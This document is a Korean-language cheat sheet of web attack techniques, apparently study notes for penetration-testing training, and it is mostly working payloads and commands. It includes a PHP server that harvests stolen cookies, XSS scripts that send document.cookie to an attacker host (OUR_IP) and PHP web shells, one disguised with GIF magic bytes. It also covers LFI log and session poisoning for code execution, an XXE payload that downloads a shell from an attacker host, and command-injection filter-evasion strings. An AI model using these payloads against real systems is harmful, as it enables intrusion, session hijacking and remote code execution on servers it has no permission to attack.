# 웹 취약점 공격 기법 모음

<details><summary><strong>Encoding</strong></summary>

```bash
# 문자열을 URI 인코딩으로 변환
echo 'hi!' | jq -srR '@uri'

# 16진수 변환
echo 'hi!' | xxd -p -c 1000

# md5 변환
echo 'hi!' | md5sum
```

</details>

---

<details>
<summary><strong>XSS (Cross-Site Scripting)</strong></summary>

## XSS (Cross-Site Scripting)

> 웹 애플리케이션에 악성 스크립트를 주입하여 사용자의 브라우저에서 실행시키는 공격 기법입니다.

### 기본 공격 페이로드

#### 스크립트 태그 기반
```html
<!-- 기본 alert 실행 - 현재 도메인 정보 확인 -->
<script>alert(window.origin)</script>

<!-- 쿠키 정보 탈취 -->
<script>alert(document.cookie)</script>

<!-- 단순 XSS 동작 확인 -->
<script>alert('XSS')</script>

<!-- 콘솔 로그 출력 - 디버깅 및 정보 수집 -->
<script>console.log(document.cookie)</script>
```

#### 이벤트 핸들러 기반
```html
<!-- 이미지 로드 실패 시 스크립트 실행 -->
<img src="" onerror=alert(window.origin)>
<img src=x onerror=alert(document.cookie)>

<!-- 다양한 이벤트 핸들러 활용 -->
<img src=x onload=alert('XSS')>          <!-- 이미지 로드 완료 시 -->
<body onload=alert('XSS')>               <!-- 페이지 로드 완료 시 -->
<input onfocus=alert('XSS') autofocus>   <!-- 자동 포커스 시 -->
<svg onload=alert('XSS')>                <!-- SVG 로드 시 -->
```

#### HTML 태그 속성 활용

```html
<!-- a 태그의 href 속성 - 클릭 유도 필요 -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- iframe 활용 - 자동 실행 가능 -->
<iframe src="javascript:alert('XSS')"></iframe>
```

---

### Stored XSS (저장형 XSS)
> 악성 스크립트가 서버의 데이터베이스에 저장되어, 다른 사용자가 해당 페이지를 방문할 때마다 스크립트가 실행되는 공격입니다.
> 
> **주요 발생 위치:** 게시판, 댓글, 프로필, 사용자 입력이 저장되는 모든 곳

#### 공격 페이로드

```html
<!-- 현재 origin 정보를 alert로 출력 -->
<script>alert(window.origin)</script>

<!-- 쿠키 정보를 alert로 출력 - 세션 하이재킹 가능 -->
<script>alert(document.cookie)</script>

<!-- 인쇄 대화상자 호출 - 사용자 방해 -->
<script>print()</script>

<!-- 이후 모든 HTML을 평문으로 처리 (페이지 렌더링 중단) -->
<plaintext>
```
<img width="1106" height="94" alt="image" src="https://github.com/user-attachments/assets/d9fdaeb7-2eef-4bf8-9b50-1d10c952551f" />

---

### Reflected XSS (반사형 XSS)
> 공격자가 악성 스크립트가 포함된 URL을 만들어 피해자에게 전달하면, 피해자가 해당 링크를 클릭했을 때 서버가 URL의 파라미터를 검증 없이 응답 페이지에 그대로 반영하여 스크립트가 실행되는 공격입니다.
> 
> **주요 발생 위치:** 검색 쿼리, 에러 메시지, URL 파라미터가 화면에 출력되는 곳

#### 공격 페이로드

```html
<!-- 기본 스크립트 삽입 -->
<script>alert(window.origin)</script>
```

**공격 URL 예시:** 
```
http://example.com/search?q=<script>alert(window.origin)</script>
```
<img width="1414" height="94" alt="image" src="https://github.com/user-attachments/assets/e8ad87e9-20b1-4f92-83fc-284fc006087e" />

---

### DOM XSS (DOM 기반 XSS)
> 클라이언트 측 JavaScript 코드가 사용자 입력을 안전하지 않게 처리할 때 발생하는 XSS입니다. 
> 서버를 거치지 않고 브라우저의 DOM을 직접 조작하여 공격이 이루어집니다.

#### 취약한 JavaScript 함수들

```javascript
// 동적으로 HTML을 작성하는 함수들 - 사용자 입력을 필터링 없이 사용 시 취약
document.write()      // 문서에 직접 쓰기
DOM.innerHTML         // 요소의 HTML 내용 설정
DOM.outerHTML         // 요소 자체를 HTML로 교체
add()                 // 요소 추가
after()               // 요소 다음에 삽입
append()              // 요소 끝에 추가
```

**주의사항:** 이러한 함수들에 사용자 입력이 필터링 없이 전달되면 XSS 공격에 취약합니다.

---

### Advanced XSS 기법
> 외부 서버와 연동하여 쿠키를 탈취하거나, 복잡한 페이로드를 체이닝하는 고급 공격 기법입니다.

#### 1. 쿠키 탈취 서버 구축

**PHP 서버 측 코드 (index.php):**
```php
<?php
# 쿠키 정보를 받아서 cookies.txt 파일에 저장
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**서버 실행:**
```bash
# PHP 내장 웹 서버를 80포트로 실행 (root 권한 필요)
sudo php -S 0.0.0.0:80
```

#### 2. 다양한 스크립트 삽입 페이로드

```html
<!-- 외부 스크립트 파일 로드 - 가장 기본적인 방법 -->
<script src=http://OUR_IP></script>

<!-- 따옴표로 속성 닫기 후 스크립트 삽입 -->
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>

<!-- JavaScript URI를 통한 스크립트 실행 - URL 인코딩 우회 가능 -->
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<!-- XMLHttpRequest를 이용한 스크립트 로드 - 비동기 요청 -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<!-- jQuery를 이용한 스크립트 로드 - jQuery 사용 사이트에서 유용 -->
<script>$.getScript("http://OUR_IP")</script>
```

#### 3. 쿠키 탈취 스크립트 (script.js)

```javascript
// document.location을 이용한 리다이렉트 방식 - 사용자가 인지 가능
document.location='http://OUR_IP/index.php?c='+document.cookie;

// Image 객체를 이용한 백그라운드 전송 - 사용자가 인지하기 어려움 (권장)
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

#### 4. 공격 실행 예시

<img width="832" height="704" alt="image" src="https://github.com/user-attachments/assets/3aa72f40-1ead-4db1-8c05-68c42ad656cf" />

**공격 절차:**
1. 각각의 input 필드에 XSS 페이로드를 테스트
2. XSS 취약점이 있는 input을 식별
3. 해당 input에 `script.js`를 요청하는 페이로드 삽입
4. 피해자가 페이지를 방문하면 자동으로 쿠키가 공격자 서버로 전송됨

</details>

---

<details>
<summary><strong>LFI (Local File Inclusion)</strong></summary>

## LFI (Local File Inclusion)

> 웹 애플리케이션이 사용자 입력을 적절히 검증하지 않아 서버의 로컬 파일을 읽을 수 있는 취약점입니다.

### 기본 공격 기법

#### 공격 팁
- 최소한의 `../` 개수를 찾아서 사용할 것
- 에러 메시지 내용을 보고 경로를 유추할 수 있음
- 안될 시에 payload를 URL ENCODED로 시도해볼 것

#### 주요 타겟 파일
```bash
# Linux
/etc/passwd           # 시스템 사용자 정보
/etc/shadow           # 암호화된 패스워드 (권한 필요)
/proc/self/environ    # 환경 변수
/var/log/apache2/access.log  # 웹 서버 로그

# Windows
C:\Windows\boot.ini   # 부트 설정
C:\Windows\System32\drivers\etc\hosts  # hosts 파일
```

#### 기본 페이로드

```bash
# 기본 경로 탐색
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd

# 절대 경로 시도
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd

# 필터 우회 - 점과 슬래시 조합
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd

# URL 인코딩 우회
http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# 접두사가 추가되는 경우
http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd

```

#### 다양한 필터 우회 기법
```bash
..././           # 점 3개 슬래시
....\/           # 점 4개 백슬래시
....////         # 점 4개 슬래시 4개
%2e%2e%2f        # URL 인코딩
/etc/passwd%00   # Null byte 삽입 (PHP 5.3 이하)
```

#### 경로 길이 제한 우회 스크립트
```bash
# 점과 슬래시를 2048번 반복하여 경로 길이 제한 우회
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

#### Username을 이용한 LFI
```
예: 프로필 이미지 다운로드 URL이 /profile/$username/avatar.png 형식일 때
악의적인 username을 생성 (예: ../../../etc/passwd)
서버가 이를 검증하지 않으면 다른 파일에 접근 가능
```

---

### PHP Filters
> PHP의 stream filter를 이용하여 파일 내용을 인코딩하거나 변환하여 읽는 기법

#### Base64 인코딩을 통한 소스 코드 읽기
```bash
# PHP 설정 파일 읽기
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config

# 반환된 Base64 디코딩
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

**활용 사례:**
- PHP 소스 코드를 평문으로 읽을 수 없을 때 사용
- 데이터베이스 설정 파일, 인증 정보 탈취에 유용

---

### PHP Wrappers
> PHP의 다양한 wrapper를 이용한 코드 실행 기법

#### 전제 조건
```bash
# php.ini에서 allow_url_include 설정 확인
allow_url_include = On

# 설정 확인 명령
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

#### PHP 설정 파일 위치
```bash
# Apache 환경
/etc/php/X.Y/apache2/php.ini

# PHP-FPM 환경
/etc/php/X.Y/fpm/php.ini
```

#### data:// Wrapper
```bash
# Base64 인코딩된 PHP 코드 생성
# <?php system($_GET["cmd"]); ?>를 Base64로 인코딩
echo '<?php system($_GET["cmd"]); ?>' | base64
# 결과: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# data:// wrapper를 통한 코드 실행
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

#### input:// Wrapper
```bash
# POST 데이터로 PHP 코드 전송 (GET 파라미터로 명령 실행)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

# POST 데이터로 직접 명령 실행
curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input"
```

#### Expect Wrapper
```bash
# php.ini에서 expect 확장 모듈 활성화 필요
extension=expect

# expect:// wrapper를 통한 명령 실행
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

---

### 로그 파일 포함 (Log Poisoning)
> 웹 서버 로그 파일에 악성 코드를 삽입한 후, LFI를 통해 해당 로그 파일을 포함시켜 코드를 실행하는 기법입니다.

#### 주요 로그 파일 위치
```bash
# Apache (Linux)
/var/log/apache2/access.log
/var/log/apache2/error.log

# Apache (Windows)
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log

# Nginx (Linux)
/var/log/nginx/access.log
/var/log/nginx/error.log

# Nginx (Windows)
C:\nginx\log\access.log
C:\nginx\log\error.log

# 기타 유용한 로그 파일
/proc/self/environ          # 환경 변수
/proc/self/fd/<pid>         # 파일 디스크립터
/var/log/sshd.log           # SSH 로그
/var/log/mail               # 메일 로그
/var/log/vsftpd.log         # FTP 로그
```

#### 공격 절차
1. **세션 ID 확인:** 브라우저 쿠키에서 `PHPSESSID` 값 확인
2. **세션 파일 위치 확인**
3. **세션 파일 읽기**
4. **세션에 악성 코드 삽입**
5. **세션 파일 실행**

---

### PHP 세션 파일 포함
> PHP 세션 파일에 악성 코드를 저장한 후 LFI로 포함시키는 기법입니다.

#### PHP 세션 파일 위치
```bash
# PHP 세션 파일 기본 위치
/var/lib/php/sessions/sess_<SESSION_ID>

# 예시
/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

#### 공격 예시
```bash
# 1. 세션 파일 읽기
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

# 2. 세션에 데이터 저장 (정상적인 기능 사용)
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning

# 3. 세션 파일 다시 확인
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

**세션 poisoning 예시:**

<img width="2091" height="568" alt="image" src="https://github.com/user-attachments/assets/74a9ffbf-55d1-481f-9d8f-1f2308ebdcf6" />

```bash
# 4. 악성 PHP 코드를 세션에 삽입 (language 파라미터 사용)
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# 5. 세션 파일을 포함시켜 명령 실행
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

---

### User-Agent를 이용한 Log Poisoning

```bash
# 1. 악성 PHP 코드를 User-Agent에 삽입
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison

# 2. 커스텀 User-Agent로 요청 전송
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison

# 3. LFI를 통해 로그 파일 포함 및 명령 실행
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

**Log poisoning 예시:**

<img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/9673d26a-6ded-46df-8d67-b7b9e7bf1422" />


</details>

---

<details>
<summary><strong>RFI (Remote File Inclusion)</strong></summary>

## RFI (Remote File Inclusion)

> 외부 서버의 악성 파일을 포함시켜 실행하는 공격 기법입니다.

### 기본 RFI 공격

#### HTTP를 통한 원격 파일 포함
```bash
# 로컬 서버의 파일 포함 (테스트)
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

# 공격자 서버의 악성 파일 포함
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

---

### FTP를 통한 원격 파일 포함
```bash
# FTP 서버 실행 (Python pyftpdlib 사용)
sudo python3 -m pyftpdlib -p 21

# FTP를 통한 파일 포함
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

---

### SMB를 통한 원격 파일 포함 (Windows)
```bash
# Impacket의 smbserver.py 실행(NTLM 해시 탈취 가능)
impacket-smbserver -smb2support share $(pwd)

# SMB를 통한 파일 포함
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

---


### Fuzzing을 통한 LFI/RFI 취약점 발견

#### 유용한 Wordlist

```bash
# LFI 페이로드 Wordlist
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

# Linux 웹 루트 디렉토리 Wordlist
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt

# Windows 웹 루트 디렉토리 Wordlist
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

# Linux LFI Wordlist
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

# Windows LFI Wordlist
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
```

#### GET 파라미터 퍼징
```bash
# GET 파라미터 퍼징 - 어떤 파라미터가 파일 포함에 취약한지 탐색
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
     -fs 2287
```

---

#### LFI Wordlist를 이용한 페이로드 테스트
```bash
# LFI 페이로드 퍼징 - 어떤 경로 조합이 유효한지 탐색
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
     -fs 2287
```

---

#### 웹 서버 루트 디렉토리 찾기
```bash
# 웹 루트 디렉토리 퍼징 - 서버의 웹 루트 경로 식별
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
     -fs 2287
```

---

#### 로그 파일 위치 찾기
```bash
# 로그 파일 퍼징 - 접근 가능한 로그 파일 탐색
ffuf -w ./LFI-WordList-Linux:FUZZ \
     -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
     -fs 2287
```

</details>

---

<details>
<summary><strong>SSTI (Server-Side Template Injection)</strong></summary>

## SSTI (Server-Side Template Injection)

> 템플릿 엔진이 사용자 입력을 안전하게 처리하지 않아 서버 측에서 임의 코드를 실행할 수 있는 취약점입니다.

### 기본 탐지 페이로드

#### 다양한 템플릿 엔진 테스트
```html
<!-- Jinja2, Twig (Python, PHP) -->
{{7*7}}

<!-- Mako, JSP (Python, Java) -->
${7*7}

<!-- ERB (Ruby) -->
<%= 7*7 %>

<!-- Freemarker (Java) -->
${{7*7}}

<!-- Thymeleaf (Java) -->
#{7*7}

<!-- Velocity (Java) -->
*{7*7}
```

**탐지 방법:**
- 위 페이로드를 입력했을 때 `49`가 출력되면 SSTI 취약점 존재
- 각 템플릿 엔진마다 다른 문법을 사용하므로 여러 페이로드 테스트 필요

---

### Node.js SSTI 공격

#### 특징
```javascript
// Node.js에서는 process 객체가 전역으로 존재
// child_process 모듈을 통해 시스템 명령 실행 가능
```

#### 명령 실행 페이로드
```javascript
// execSync를 이용한 동기 명령 실행 (권장)
process.mainModule.require('child_process').execSync('whoami')

// 다른 시스템 명령 예시
process.mainModule.require('child_process').execSync('cat /etc/passwd')
process.mainModule.require('child_process').execSync('ls -la')
```

**중요 사항:**
- SSTI 공격에서는 **동기(Synchronous) 함수**를 사용해야 응답을 받을 수 있음
- 비동기 함수(`exec`, `spawn` 등)는 결과를 즉시 반환하지 않아 공격에 부적합

</details>

---

<details>
<summary><strong>File Upload</strong></summary>

## File Upload

> 파일 업로드 기능의 취약점을 이용하여 악성 파일을 서버에 업로드하고 실행하는 공격 기법입니다.

### 클라이언트 사이드 검증 우회
- front에서 파일타입만 확인하는 경우 파일 이름과 내용을 바꿔서 서버로 전송(image.jpg -> ex.php)
- html 수정

<img width="1942" height="455" alt="image" src="https://github.com/user-attachments/assets/5be7d857-603b-4260-9a90-facf245bde4f" />

---

### 확장자 우회 기법

#### 유용한 Wordlist
```bash
# 다양한 웹 확장자 리스트
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# PayloadsAllTheThings PHP 확장자 리스트
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# Content-Type 리스트
/usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
```

#### 확장자 변조 예시
```bash
shell.jpg.php     # 이중 확장자
shell.php.jpg     # 역순 이중 확장자
```

---

### 매직 바이트를 이용한 우회

#### GIF 매직 바이트
```php
GIF89a;
<?php system($_REQUEST['cmd']); ?>
```

```php
GIF87a;
<?php system($_REQUEST['cmd']); ?>
```

**원리:**
- 서버가 파일의 매직 바이트(파일 시그니처)만 확인하는 경우
- GIF 파일의 매직 바이트로 시작하면 이미지로 인식하지만 PHP 코드는 여전히 실행됨

---

### 파일명 조작을 통한 우회

#### 특수 문자 삽입 스크립트
```bash
# 다양한 특수 문자를 조합하여 필터 우회 시도
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**활용 방법:**
- 생성된 wordlist를 ffuf나 Burp Suite로 테스트
- 서버의 파일명 파싱 로직 취약점을 찾아 우회

---

### SVG 파일을 이용한 공격

#### XSS가 포함된 SVG
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**활용 사례:**
- SVG 파일은 XML 기반이므로 JavaScript 코드 포함 가능
- 이미지로 인식되어 업로드가 허용되지만 XSS 공격 가능
- XXE 공격과 결합 가능

</details>

---

<details>
<summary><strong>XXE (XML External Entity) 공격</strong></summary>

## XXE (XML External Entity) 공격

> XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점을 이용한 공격입니다.

### 기본 XXE 공격

#### /etc/passwd 읽기
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

#### PHP 소스 코드 읽기 (Base64 인코딩)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

---

### Advanced XXE 공격

#### DOCTYPE 선언 규칙
- `DOCTYPE`은 XML에서 한번만 선언될 수 있다.

```xml
<!DOCTYPE root [
  <!ENTITY entity1 "value1">
  <!ENTITY entity2 "value2">
  <!ENTITY entity3 "value3">
]>
```

#### 파일 시스템 접근
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

#### PHP Filter 활용
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

#### 원격 명령 실행 (Expect 확장 필요)
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
<img width="1519" height="584" alt="image" src="https://github.com/user-attachments/assets/6b8534fb-d906-45a5-8db1-81a499d49926" />

---

### Out-of-Band (OOB) XXE

#### 외부 DTD를 이용한 데이터 추출
```bash
# 공격자 서버의 xxe.dtd 파일 생성
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```

---

### Error Based XXE

<img width="1531" height="451" alt="image" src="https://github.com/user-attachments/assets/2dff7e87-5b48-4bac-a09b-be73493d0927" />
<img width="1291" height="330" alt="image" src="https://github.com/user-attachments/assets/6984084b-09fa-45e3-b415-787cfd41e662" />

---

### Blind XXE

#### PHP 스크립트로 데이터 수신
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
<img width="1157" height="398" alt="image" src="https://github.com/user-attachments/assets/e958cdff-ff72-4aee-b609-8f64214e9cd1" />

---

### 자동화 도구 (XXEinjector)

```bash
# XXEinjector 설치
git clone https://github.com/enjoiz/XXEinjector.git
```

#### 사용 방법
- request에서 xml부분을 지워줘야한다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
# XXEinjector 실행
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

</details>

---

<details>
<summary><strong>Command Injection</strong></summary>

## Command Injection

> 사용자 입력이 시스템 명령으로 실행될 때 악의적인 명령을 주입하는 공격 기법입니다.

### 기본 우회 기법
- front에서만 처리되는 validation 해제하고 실행해보기. 혹은 burpsuite로 우회하기.

---

### 환경 변수를 이용한 문자 추출

#### Linux/Unix
```bash
# PATH 환경 변수의 첫 번째 문자 추출 (/)
echo ${PATH:0:1}

# HOME 환경 변수의 첫 번째 문자 추출
echo ${HOME:0:1}

# 현재 디렉토리의 첫 번째 문자 추출
echo ${PWD:0:1}

# LS_COLORS 환경 변수의 10번째 문자 추출
echo ${LS_COLORS:10:1}
```

#### Windows
```powershell
# HOMEPATH 환경 변수의 일부 추출
echo %HOMEPATH:~6,-11%

# PowerShell에서 환경 변수의 첫 번째 문자
$env:HOMEPATH[0]

# PowerShell에서 PROGRAMFILES의 10번째 문자
$env:PROGRAMFILES[10]
```

---

### 명령 체이닝

#### 기본 구분자
```bash
# 세미콜론 - 이전 명령과 관계없이 다음 명령 실행
127.0.0.1;whoami

# AND 연산자 - 이전 명령이 성공하면 다음 명령 실행
127.0.0.1&&whoami

# OR 연산자 - 이전 명령이 실패하면 다음 명령 실행
127.0.0.1||whoami

# 개행 문자 - 새 줄에서 명령 실행
127.0.0.1%0awhoami
```

---

### 필터 우회 기법

#### 공백 우회
```bash
# 탭 문자 사용
127.0.0.1%0a%09whoami

# IFS (Internal Field Separator) 사용
127.0.0.1%0a${IFS}whoami

# Brace Expansion 사용
127.0.0.1%0a{ls,-al}

# 환경 변수와 IFS 조합
127.0.0.1${LS_COLORS:10:1}${IFS}
```

---

### 문자 필터 우회

#### 따옴표를 이용한 우회
```bash
# 작은따옴표로 문자 분리
127.0.0.1%0aw'h'o'am'i

# 큰따옴표로 문자 분리
127.0.0.1%0aw"h"o"am"i
```

#### Windows 대소문자 무시
```bash
# Windows는 대소문자를 구분하지 않음
127.0.0.1%0aWhOaMi
```

#### Windows PowerShell 역순 실행
```powershell
# 문자열을 역순으로 배열한 후 실행
127.0.0.1%0aiex "$('imaohw'[-1..-20] -join '')"

# Base64 인코딩 우회
127.0.0.1%0a[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

#### Linux 문자열 변환
```bash
# 대문자를 소문자로 변환
127.0.0.1%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# 문자열 역순 실행
127.0.0.1%0a$(rev<<<'imaohw')

# Base64 디코딩 후 실행
127.0.0.1%0abash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

</details>

---

<details>
<summary><strong>Bypassing Basic Authentication</strong></summary>

## Bypassing Basic Authentication

> HTTP 기본 인증을 우회하는 다양한 기법입니다.

### HTTP 메서드 변조

#### OPTIONS 메서드 확인
```bash
# 서버가 지원하는 HTTP 메서드 확인
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

**활용 방법:**
- 특정 기능에 대한 권한이 없을 때 request method를 변경해서 시도
- GET에서 POST로, POST에서 PUT으로 변경
- `burpsuite` : `change request method` 기능 활용

**예시:**
- GET 요청이 막혔을 때 POST로 변경
- DELETE 권한이 없을 때 POST나 PUT 시도
- HEAD 메서드로 정보 수집

</details>

---

<details>
<summary><strong>IDOR</strong></summary>

## IDOR (Insecure Direct Object Reference)

> 사용자가 접근 권한 없는 객체에 직접 참조하여 접근할 수 있는 취약점입니다.

### 기본 공격 기법

#### URL 파라미터 조작
```
# uid 파라미터를 변경하여 다른 사용자의 문서 접근
http://SERVER_IP:PORT/documents.php?uid=<change>
```


**공격 절차:**
1. API method 변경해서 시도해보기 (GET → POST, PUT, DELETE)
2. 파라미터 값을 순차적으로 변경하며 테스트
3. 인코딩된 값이 있다면 디코딩하여 규칙 파악

---

### 자동화 스크립트

#### 문서 링크 추출 및 다운로드
```bash
# 특정 uid의 문서 링크 추출
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

#### 다수의 uid에서 문서 다운로드
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

# uid 1부터 10까지 반복
for i in {1..10}; do
        # 각 uid의 문서 링크 추출 및 다운로드
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

---

### 해시된 ID를 사용하는 경우

#### Base64 + MD5 조합 우회
```bash
#!/bin/bash

# uid를 Base64로 인코딩 후 MD5 해시하여 요청
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

**활용 사례:**
- 서버가 uid를 Base64 인코딩 후 MD5 해시하여 사용하는 경우
- 순차적인 ID를 예측 가능한 방식으로 변환한 경우

</details>
